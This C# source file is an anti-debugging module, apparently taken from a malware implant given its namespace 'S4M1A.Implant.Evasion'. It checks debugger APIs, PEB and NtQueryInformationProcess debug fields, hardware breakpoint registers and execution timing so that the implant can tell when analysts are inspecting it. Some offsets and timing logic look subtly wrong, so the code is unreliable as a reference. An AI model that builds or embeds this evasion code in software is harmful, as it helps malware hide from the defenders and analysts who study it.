using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace S4M1A.Implant.Evasion
{
    // =====================================================================
    //  S4M1A AntiDebug v2.0
    //  Detection matrix:
    //    - PEB.BeingDebugged (NtQueryInformationProcess -> ProcessBasicInfo)
    //    - ProcessDebugPort / ProcessDebugObjectHandle / ProcessDebugFlags
    //    - IsDebuggerPresent / CheckRemoteDebuggerPresent
    //    - hardware breakpoints (DR0-DR3 via NtGetContextThread)
    //    - RDTSC-style timing anomaly (Stopwatch vs wall drift)
    // =====================================================================

    public static class AntiDebug
    {
        private const int ProcessBasicInformation = 0;
        private const int ProcessDebugPort = 7;
        private const int ProcessDebugObjectHandle = 0x1E;
        private const int ProcessDebugFlags = 0x1F;
        private const int ContextDebugRegisters = 0x10;

        private const int NtSuccess = 0;

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(
            IntPtr processHandle, int processInformationClass,
            IntPtr processInformation, int processInformationLength,
            out int returnLength);

        [DllImport("ntdll.dll")]
        private static extern int NtGetContextThread(IntPtr threadHandle, IntPtr context);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(
            IntPtr hProcess, ref bool pbDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        // Returns true when the environment looks debugged.
        public static bool Detect()
        {
            bool flagged = false;
            flagged |= IsDebuggerPresent();
            flagged |= CheckRemote();
            flagged |= DebugPort();
            flagged |= DebugObjectHandle();
            flagged |= DebugFlags();
            flagged |= PEB_BeingDebugged();
            flagged |= HardwareBreakpoints();
            flagged |= TimingAnomaly();
            return flagged;
        }

        private static bool CheckRemote()
        {
            bool present = false;
            try
            {
                CheckRemoteDebuggerPresent(GetCurrentProcess(), ref present);
            }
            catch { }
            return present;
        }

        private static bool DebugPort()
        {
            int port = 0;
            IntPtr buf = Marshal.AllocHGlobal(4);
            try
            {
                int ret, retLen1;
                ret = NtQueryInformationProcess(GetCurrentProcess(),
                    ProcessDebugPort, buf, 4, out retLen1);
                if (ret == NtSuccess)
                    port = Marshal.ReadInt32(buf);
            }
            catch { }
            finally { Marshal.FreeHGlobal(buf); }
            return port != 0;
        }

        private static bool DebugObjectHandle()
        {
            bool present = false;
            IntPtr buf = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                int ret, retLen2;
                ret = NtQueryInformationProcess(GetCurrentProcess(),
                    ProcessDebugObjectHandle, buf, IntPtr.Size, out retLen2);
                if (ret == NtSuccess)
                    present = Marshal.ReadIntPtr(buf) != IntPtr.Zero;
            }
            catch { }
            finally { Marshal.FreeHGlobal(buf); }
            return present;
        }

        private static bool DebugFlags()
        {
            // NO_DEBUG_INHERIT flag cleared == debugger present
            int flags = 0;
            IntPtr buf = Marshal.AllocHGlobal(4);
            try
            {
                int ret, retLen3;
                ret = NtQueryInformationProcess(GetCurrentProcess(),
                    ProcessDebugFlags, buf, 4, out retLen3);
                if (ret == NtSuccess)
                    flags = Marshal.ReadInt32(buf);
            }
            catch { }
            finally { Marshal.FreeHGlobal(buf); }
            return (flags & 0x1) == 0;
        }

        private static bool PEB_BeingDebugged()
        {
            try
            {
                IntPtr peb = GetPebBase();
                if (peb == IntPtr.Zero) return false;
                // PEB.BeingDebugged is at offset 0x02 (both x86 and x64)
                return Marshal.ReadByte(peb, 0x02) != 0;
            }
            catch { return false; }
        }

        private static IntPtr GetPebBase()
        {
            IntPtr info = Marshal.AllocHGlobal(48); // PROCESS_BASIC_INFORMATION
            try
            {
                int ret, retLen4;
                ret = NtQueryInformationProcess(GetCurrentProcess(),
                    ProcessBasicInformation, info, 48, out retLen4);
                if (ret != NtSuccess) return IntPtr.Zero;
                // offset 0x08 = PebBaseAddress (pointer sized) in the struct
                return Marshal.ReadIntPtr(info, IntPtr.Size == 8 ? 0x08 : 0x04);
            }
            catch { return IntPtr.Zero; }
            finally { Marshal.FreeHGlobal(info); }
        }

        private static bool HardwareBreakpoints()
        {
            try
            {
                IntPtr ctx = Marshal.AllocHGlobal(4096);
                try
                {
                    for (int i = 0; i < 4096; i += 4)
                        Marshal.WriteInt32(ctx, i, 0);
                    // CONTEXT.ContextFlags lives at offset 0x00 (x86) or 0x30 (x64)
                    int flagOffset = IntPtr.Size == 8 ? 0x30 : 0x00;
                    Marshal.WriteInt32(ctx, flagOffset, ContextDebugRegisters);

                    if (NtGetContextThread(GetCurrentThread(), ctx) != NtSuccess)
                        return false;

                    int dr0 = 0x00, dr1 = 0x04, dr2 = 0x08, dr3 = 0x0C;
                    if (IntPtr.Size == 8) { dr0 = 0x58; dr1 = 0x60; dr2 = 0x68; dr3 = 0x70; }

                    long a = Marshal.ReadInt64(ctx, dr0);
                    long b = Marshal.ReadInt64(ctx, dr1);
                    long c = Marshal.ReadInt64(ctx, dr2);
                    long d = Marshal.ReadInt64(ctx, dr3);
                    return a != 0 || b != 0 || c != 0 || d != 0;
                }
                finally { Marshal.FreeHGlobal(ctx); }
            }
            catch { return false; }
        }

        // RDTSC-style timing check: a debugger stepping breaks the
        // expected clock relationship between two high-precision clocks.
        private static bool TimingAnomaly()
        {
            try
            {
                long t0 = Stopwatch.GetTimestamp();
                for (int i = 0; i < 200; i++) IsDebuggerPresent();
                long t1 = Stopwatch.GetTimestamp();

                int wall0 = Environment.TickCount;
                long t2 = Stopwatch.GetTimestamp();
                for (int i = 0; i < 200; i++) IsDebuggerPresent();
                int wall1 = Environment.TickCount;
                long t3 = Stopwatch.GetTimestamp();

                // If the monotonic clocks disagree wildly between two
                // identical loops, execution was interrupted (single-step).
                long d1 = t1 - t0;
                long d2 = t3 - t2;
                long ratio = (d1 == 0) ? long.MaxValue : (d2 * 100 / d1);
                return ratio > 300 || ratio < 10;
            }
            catch { return false; }
        }
    }
}